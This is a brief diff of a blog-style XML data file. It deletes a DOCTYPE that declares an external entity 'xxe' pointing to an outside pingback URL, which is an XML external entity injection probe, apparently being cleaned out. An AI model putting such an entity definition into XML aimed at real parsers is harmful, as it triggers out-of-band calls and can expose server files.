@@ -1,6 +1,4 @@
-<?xml version="1.0" encoding="ISO-8859-1"?>
-    <!DOCTYPE foo [<!ELEMENT foo ANY>
-    <!ENTITY xxe SYSTEM "http://pingb.in/p/4cd02dfed1c894c72e0752a5a99a">]>
+
     <Blog>
 
     <date>01,August,2004</date>
